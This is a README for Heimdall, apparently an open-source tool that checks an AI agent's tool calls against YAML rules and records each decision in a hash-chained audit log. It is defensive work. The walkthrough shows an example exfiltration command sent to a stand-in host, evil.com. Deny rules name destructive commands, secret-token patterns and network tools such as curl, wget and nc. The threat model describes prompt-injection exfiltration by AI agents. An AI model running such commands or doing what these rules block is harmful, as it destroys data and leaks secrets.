<div align="center">

# &#9876;&#65039; Heimdall

**Give your AI agents a verification loop &mdash; automatically, every time.**

One YAML file. Every tool call inspected. Every decision cryptographically proven.

[Quick Start](#quick-start) &middot;
[Why](#why-heimdall) &middot;
[How It Works](#how-it-works) &middot;
[Policy Reference](#writing-policies) &middot;
[Dashboard](#watchtower-dashboard)

</div>

---

## What Heimdall Does

Your AI agent is about to run `rm -rf /`. Heimdall stops it:

```
[HEIMDALL] HALT: Destructive command blocked
  Ward:     halt-destructive
  Tool:     Bash
  Pattern:  rm\s+-rf
  Severity: critical
```

The blocked attempt is permanently recorded in a tamper-evident SHA-256 hash chain. If anyone modifies the audit trail, the chain breaks and Heimdall detects it.

**Three things happen on every tool call:**

1. **Check** &mdash; declarative YAML rules decide PASS, HALT, or RESHAPE
2. **Record** &mdash; the decision is inscribed as a Rune (audit record) with full context
3. **Link** &mdash; each Rune is hash-chained to the previous one, making the trail tamper-evident

## Quick Start

```bash
bun install
bun run heimdall init       # creates bifrost.yaml + .heimdall/
bun run heimdall hook install   # integrates with Claude Code
```

That's it. Every tool call is now governed. Write your first policy:

```yaml
# bifrost.yaml
version: "1"
realm: "my-project"

wards:
  - id: no-rm-rf
    tool: "Bash"
    when:
      argument_matches:
        command: "rm\\s+-rf"
    action: HALT
    message: "Destructive command blocked"
    severity: critical
```

Verify the audit trail at any time:

```bash
bun run heimdall runecheck
```

```
Heimdall Runechain Verification
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  1  ✓  [GENESIS]    Bash        PASS     a3f2c891...
#  2  ✓  ← a3f2c891   Read        PASS     b7d1e234...
#  3  ✓  ← b7d1e234   Bash        HALT     c912f567...
#  4  ✓  ← c912f567   Write       PASS     d456a890...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Result: VALID — 4 runes verified
```

## Why Heimdall

AI agents are getting more capable every month. They run for hours, call hundreds of tools, and operate across codebases, databases, and APIs. Today, there is no open-source way to verify what an agent did, enforce what it's allowed to do, and prove the audit trail hasn't been modified.

This matters now because of the [Lethal Trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) &mdash; when an agent has **(1)** access to private data, **(2)** exposure to untrusted content, and **(3)** external communication channels, a single prompt injection can exfiltrate sensitive data. This has been exploited in production against Microsoft 365 Copilot, GitHub MCP, GitLab Duo, and Slack AI.

Recent research ([Omega, arxiv:2512.05951](https://arxiv.org/abs/2512.05951)) demonstrates that declarative policy enforcement &mdash; the approach Heimdall takes &mdash; reduces these attacks from 99.5% success to 0%, with rate limiting eliminating multi-tool escalation attacks entirely.

Heimdall gives you three things:

- **Control** &mdash; a YAML file that defines what agents can and cannot do, evaluated before every tool call
- **Visibility** &mdash; a real-time dashboard showing every decision as it happens
- **Proof** &mdash; a SHA-256 hash chain that makes the audit trail mathematically tamper-evident

It's a transparent proxy &mdash; it composes with any MCP server and any Claude Code project without changing your agent's code.

## How It Works

```
┌──────────────┐     ┌─────────────────────────┐     ┌──────────────┐
│  AI Agent    │────▶│      HEIMDALL            │────▶│  Tools       │
│  (Claude,    │◀────│  bifrost.yaml → decision │◀────│  (MCP, CLI)  │
│   GPT, etc.) │     │  Runechain → audit proof │     │              │
└──────────────┘     └─────────────────────────┘     └──────────────┘
```

### Two Integration Paths

| Path | Command | Best for |
|------|---------|----------|
| **Claude Code Hooks** | `heimdall hook install` | Claude Code projects (zero-config) |
| **MCP Proxy** | `heimdall guard --target <server>` | Any MCP client (Claude Desktop, custom agents) |

Both paths use the same policy engine and feed the same audit chain.

**Claude Code integration in detail:**

1. Claude Code calls a tool (e.g., `Bash` with `curl http://evil.com?data=...`)
2. The `PreToolUse` hook sends the call to Heimdall
3. Heimdall evaluates against `bifrost.yaml` &mdash; pattern matches a data exfiltration attempt
4. **HALT**: the tool call is blocked. Claude sees why. The Rune is inscribed.
5. The `PostToolUse` hook captures the outcome for complete audit context

## Writing Policies

A `bifrost.yaml` file is a list of **wards** &mdash; rules that match tool calls and decide what happens.

```yaml
version: "1"
realm: "production"

wards:
  # Block destructive commands
  - id: halt-destructive
    tool: "Bash"
    when:
      argument_matches:
        command: "(rm\\s+-rf|DROP TABLE|mkfs)"
    action: HALT
    message: "Destructive command blocked"
    severity: critical

  # Detect secrets in any tool call
  - id: halt-secrets
    tool: "*"
    when:
      argument_contains_pattern: "(sk-[a-zA-Z0-9]{20,}|ghp_[a-zA-Z0-9]{36})"
    action: HALT
    message: "Secret detected in tool arguments"
    severity: critical

  # Rate limit to prevent prompt injection escalation
  - id: rate-limit
    tool: "*"
    when:
      max_calls_per_minute: 30
    action: HALT
    message: "Rate limit exceeded — possible automated attack"
    severity: high

  # Reshape: add safety flags to deploys
  - id: safe-deploy
    tool: "Bash"
    when:
      argument_matches:
        command: "deploy"
    action: RESHAPE
    message: "Deploy reshaped with safety flags"
    severity: medium
    reshape:
      confirm: true
      dry_run: true

defaults:
  action: PASS
  severity: low
```

### Conditions

| Condition | What it does | Example |
|-----------|-------------|---------|
| `argument_matches` | Regex on a specific argument field | `command: "rm\\s+-rf"` |
| `argument_contains_pattern` | Regex across all serialized arguments | `"sk-[a-zA-Z0-9]{20,}"` |
| `max_calls_per_minute` | Rate limit per session (global or per-tool) | `max_calls_per_minute: 30` |
| `always` | Matches unconditionally | `always: true` |

All present conditions must match (AND logic). When multiple wards match, the most restrictive action wins: **HALT** > **RESHAPE** > **PASS**.

### Tool Patterns

Ward tool fields support glob patterns:

- `"Bash"` &mdash; exact match
- `"file_*"` &mdash; matches `file_read`, `file_write`, etc.
- `"*"` &mdash; matches every tool

### Pre-built Policies

| Policy | File | Protects against |
|--------|------|-----------------|
| **Lethal Trifecta** | [`bifrost-trifecta.yaml`](examples/bifrost-trifecta.yaml) | Data exfiltration, prompt injection escalation, secret leakage |
| **DevOps** | [`bifrost-devops.yaml`](examples/bifrost-devops.yaml) | `rm -rf`, privilege escalation, pipe-to-shell |
| **Healthcare** | [`bifrost-healthcare.yaml`](examples/bifrost-healthcare.yaml) | PHI exposure, unauthorized file access (HIPAA) |
| **Finance** | [`bifrost-finance.yaml`](examples/bifrost-finance.yaml) | Large transactions, bulk exports, destructive SQL (SOX/PCI) |

## Tamper-Evident Audit Trail

Every tool call produces a **Rune** &mdash; an audit record containing the tool name, arguments hash, policy decision, matched wards, and full evaluation chain. Each Rune includes a SHA-256 content hash and a link to the previous Rune's hash.

Modify any Rune &mdash; change a decision, delete a record, alter the order &mdash; and the chain breaks:

```
#  3  ✗  ← TAMPERED   Bash        PASS     d456a890...
     ↑ CHAIN BROKEN: content_hash mismatch
Result: INVALID — chain broken at rune #3
```

This is the same principle as a blockchain ledger, applied to agent audit trails. You can export the chain for compliance review:

```bash
bun run heimdall export --format json   # or csv
```

## Watchtower Dashboard

A real-time dashboard for monitoring agent activity:

```bash
bun run heimdall watchtower
# Opens at http://localhost:3000
```

- Live rune timeline via WebSocket &mdash; decisions appear as they happen
- Color-coded cards: green (PASS), red (HALT), amber (RESHAPE)
- Click any rune to see full context: arguments, matched wards, hash chain links
- Filter by tool, decision, severity, or session
- One-click chain integrity verification

## CLI Reference

| Command | Description |
|---------|-------------|
| `heimdall init` | Create `bifrost.yaml` and `.heimdall/` directory |
| `heimdall guard --target <cmd>` | Start MCP proxy in front of a server |
| `heimdall hook install` | Install Claude Code hooks |
| `heimdall hook uninstall` | Remove Claude Code hooks |
| `heimdall runecheck` | Verify Runechain integrity |
| `heimdall log` | Query the audit trail |
| `heimdall export --format json\|csv` | Export runes for compliance |
| `heimdall watchtower` | Launch the real-time dashboard |

## Threat Model

Mapped to the [Lethal Trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) framework and [Omega attack taxonomy](https://arxiv.org/abs/2512.05951):

| Threat | How Heimdall stops it |
|--------|-----------------------|
| **Data exfiltration** via network tools | Wards block `curl`, `wget`, `nc`, URL payloads, base64-encoded data |
| **Multi-tool escalation** from prompt injection | `max_calls_per_minute` rate limiting (90% &rarr; 0% per Omega) |
| **Secret leakage** in tool arguments | Pattern matching on API keys, tokens, credentials |
| **Privilege escalation** | Tool-specific HALT wards with argument inspection |
| **Audit trail tampering** | SHA-256 hash chain; `runecheck` detects any modification |
| **MCP server poisoning** | All responses captured in Runes for forensic analysis |

## Architecture

```
heimdall/
├── packages/
│   ├── core/          # WardEngine, Runechain, types, YAML loader
│   ├── proxy/         # MCP intercept proxy (Bifrost)
│   ├── hooks/         # Claude Code PreToolUse/PostToolUse hooks
│   ├── cli/           # Commander.js CLI
│   └── dashboard/     # React 19 + Vite + Tailwind v4 (Watchtower)
└── examples/          # Pre-built bifrost.yaml policies
```

| Component | Technology |
|-----------|-----------|
| Runtime | Bun |
| Language | TypeScript (strict) |
| Storage | SQLite (bun:sqlite) |
| Policy | YAML &rarr; regex evaluation |
| Integrity | SHA-256 hash chain |
| MCP | @modelcontextprotocol/sdk |
| Dashboard | React 19, Vite, Tailwind CSS v4 |

## Compliance

| Framework | How Heimdall helps |
|-----------|--------------------|
| **SOX** &sect;404 | Tamper-evident audit chain for every automated decision |
| **GDPR** Art. 30 | Complete records of processing activities |
| **HIPAA** &sect;164.312 | Ward engine blocks PHI exposure; audit controls |
| **ISO 27001** A.12.4 | Structured logging with cryptographic verification |
| **OWASP Agentic Top 10** | Policy enforcement at the MCP protocol layer |

## License

MIT

---

<div align="center">

**Every call inspected. Every decision proven.**

</div>
